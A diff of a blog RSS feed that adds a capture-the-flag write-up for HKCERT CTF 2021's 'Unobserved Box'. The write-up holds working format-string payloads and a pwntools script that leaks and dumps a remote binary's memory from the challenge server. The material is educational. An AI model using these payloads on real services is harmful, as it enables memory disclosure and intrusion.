@@ -5,6 +5,243 @@
         <link>https://grhkm21.github.io/</link>
         <description>Recent content on Blog by grhkm21</description>
         <generator>Hugo -- gohugo.io</generator>
-        <language>en-uk</language><atom:link href="https://grhkm21.github.io/index.xml" rel="self" type="application/rss+xml" />
+        <language>en-uk</language>
+        <lastBuildDate>Sun, 14 Nov 2021 23:24:27 +0000</lastBuildDate><atom:link href="https://grhkm21.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>[Pwn/Reverse] Unobserved Box (200 pts, 6 solves)</title>
+        <link>https://grhkm21.github.io/posts/hkcert-unobserved-box/</link>
+        <pubDate>Sun, 14 Nov 2021 23:24:27 +0000</pubDate>
+        
+        <guid>https://grhkm21.github.io/posts/hkcert-unobserved-box/</guid>
+        <description>&lt;p&gt;Source of the problem: &lt;a class=&#34;link&#34; href=&#34;https://platform.ctf.hkcert.org/challenges/32&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;HKCERT CTF 2021&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;problem-statement&#34;&gt;Problem Statement&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;All codes are uncertain before the measurement, and you will never make it.&lt;/p&gt;
+&lt;p&gt;Observe the code to get the flag.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nc chalp.hkcert21.pwnable.hk 28132&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;solution-outline&#34;&gt;Solution Outline&lt;/h2&gt;
+&lt;p&gt;We dump the binary from 0x400000 to 0x405000 using format string and &lt;code&gt;%8$s&lt;/code&gt;, then reverse engineer the &lt;code&gt;check&lt;/code&gt; function for the flag.&lt;/p&gt;
+&lt;h2 id=&#34;initial-discoveries&#34;&gt;Initial Discoveries&lt;/h2&gt;
+&lt;p&gt;Let&amp;rsquo;s have a look at the server:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;❯ nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+AAAAAAAA
+AAAAAAAA is not the correct answer.
+
+❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;A&amp;#39; \* 200)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not the correct answer.
+
+❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;A&amp;#39; \* 2000)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not the correct answer.
+
+❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%p|&amp;#39; * 25)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+0x7fffe0708a40&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;0x7fffe0708a40&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;nil&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;0x7fcf5ced7d80&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;0x7fcf5ced7d80&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;0x70257c70257c7025&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;0x257c70257c70257c&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;0x7c70257c70257c70&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;0x257c70257c7025&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;0x401490&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; is not the correct answer.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Woah, we just found a format string vulnerability!&lt;/p&gt;
+&lt;h2 id=&#34;dumping-binary&#34;&gt;Dumping Binary&lt;/h2&gt;
+&lt;p&gt;With the format string vulnerability, let&amp;rsquo;s tweak it to point to our input:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%p&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;A&amp;#39; * 20)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+0x7ffc5c5ede60&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;AAAAAAAAAAAAAAAAAAAA is not the correct answer.
+
+❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%1\$p&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;A&amp;#39; * 20)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+0x7fffebbd6ef0&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;AAAAAAAAAAAAAAAAAAAA is not the correct answer.
+
+...
+
+❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%8\$p&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;A&amp;#39; * 20)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+0x4141414141414141&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;AAAAAAAAAAAAAAAAAAAA is not the correct answer.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So now that our format string &lt;code&gt;%8$p&lt;/code&gt; points to the input, how about we write an address to it? More importantly, we know that 64-bit code segments usually start at 0x400000, so we can explore that:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%8\$p&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;ABCDEFGHIJKLMNOPQRST&amp;#39;)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+0x535251504f4e4d4c&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;ABCDEFGHIJKLMNOPQRST is not the correct answer.
+
+&lt;span class=&#34;c1&#34;&gt;# 0x53 -&amp;gt; S, 0x4c -&amp;gt; L&lt;/span&gt;
+❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%8\$p&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;ABCDEFGHIJK________&amp;#39;)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+0x5f5f5f5f5f5f5f5f&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;ABCDEFGHIJK________ is not the correct answer.
+
+❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%8\$p&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&amp;#39;)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+0x400000&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;ABCDEFGHIJK is not the correct answer.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Great, now note that the &lt;code&gt;$s&lt;/code&gt; format provides functionality to output the string at the location. So for example in the last command above, if we replace &lt;code&gt;%8$p&lt;/code&gt; with &lt;code&gt;%8$s&lt;/code&gt;, we would get:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# the magic header has appeared&lt;/span&gt;
+❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%8\$p&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&amp;#39;)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+ELF&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;ABCDEFGHIJK is not the correct answer.
+
+❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%8\$s&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&amp;#39;)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; hexdump -C
+&lt;span class=&#34;m&#34;&gt;00000000&lt;/span&gt;  7f &lt;span class=&#34;m&#34;&gt;45&lt;/span&gt; 4c &lt;span class=&#34;m&#34;&gt;46&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;02&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt; 7c  &lt;span class=&#34;m&#34;&gt;41&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;42&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;43&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;44&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;45&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;46&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;47&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;.ELF...&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;ABCDEFGH&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;00000010&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;49&lt;/span&gt; 4a 4b &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;69&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 6e  6f &lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;68&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;63&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;IJK is not the c&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;00000020&lt;/span&gt;  6f &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;63&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;61&lt;/span&gt;  6e &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;77&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt; 2e 0a     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;orrect answer..&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+0000002f
+
+&lt;span class=&#34;c1&#34;&gt;# remember - 64-bit systems!&lt;/span&gt;
+❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%8\$s&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&amp;#39;)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(input().split(&amp;#39;|&amp;#39;)[0], end=&amp;#39;&amp;#39;)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; hexdump -C
+&lt;span class=&#34;m&#34;&gt;00000000&lt;/span&gt;  7f &lt;span class=&#34;m&#34;&gt;45&lt;/span&gt; 4c &lt;span class=&#34;m&#34;&gt;46&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;02&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt;                              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;.ELF...&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;00000007&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Hurray! Since strings are terminated by null-bytes, we also know that the byte after the output is a null byte, and we can continue at that address and repeat.&lt;/p&gt;
+&lt;p&gt;(Note: if there is no output, which is the case for address 0x400008)&lt;/p&gt;
+&lt;p&gt;There are a few other issues to address. An important one is when the address contains &lt;code&gt;\x0a&lt;/code&gt;, more commonly known as &lt;code&gt;\n&lt;/code&gt;, the print statement will output a newline and the server skips the part afterwards. I simply skip over them, which shouldn&amp;rsquo;t cause too much of a problem - just a single byte replaced with a null byte.&lt;/p&gt;
+&lt;p&gt;Now let&amp;rsquo;s put this all into one python script:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;WARNING&amp;#39;&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;chalp.hkcert21.pwnable.hk&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28132&lt;/span&gt;
+
+
+&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+    &lt;span class=&#34;c1&#34;&gt;# Turn 0x400102 into b&amp;#39;\x02\x01\x40\x00\x00\x00\x00\x00&amp;#39;&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;bddr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fromhex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zfill&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))[::&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+    &lt;span class=&#34;c1&#34;&gt;# Handling special case: &amp;#39;\n&amp;#39;&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bddr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+    &lt;span class=&#34;c1&#34;&gt;# Then construct payload: [fs]|[pad][bddr]&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;fs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%8$s&amp;#39;&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;pad&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ABCDEFGHIJK&amp;#39;&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pad&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bddr&lt;/span&gt;
+    &lt;span class=&#34;c1&#34;&gt;# send it!&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[*] &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; =&amp;gt; &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;
+
+
+&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x400000&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;c1&#34;&gt;# append, bytes&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;dump&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ab&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+        &lt;span class=&#34;c1&#34;&gt;# ends at null byte&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\0&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;fout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;fout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The next step is to let the code run zzz&amp;hellip;&lt;/p&gt;
+&lt;p&gt;You can download &lt;a class=&#34;link&#34; href=&#34;https://grhkm21.github.io/files/dump&#34; &gt;the binary&lt;/a&gt; I got.&lt;/p&gt;
+&lt;h2 id=&#34;reverse-engineering&#34;&gt;Reverse Engineering&lt;/h2&gt;
+&lt;p&gt;Once we have sufficient amount of the binary, we can open it in IDA or other tools. Looking around,
+we find what seems to be the check function:&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://grhkm21.github.io/images/unobserved-box-ida.png&#34; &gt;
+		&lt;img src=&#34;https://grhkm21.github.io/images/unobserved-box-ida.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			alt=&#34;Scary for a crypto one-trick!&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Scary for a crypto one-trick!&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Each block is relatively simple, and we can go through them one by one. Just a trick in general - not everything has to be carefully checked and rigorous. Looking through the code and cracking it took us one minute - guess and hand-waving work is key!&lt;/p&gt;
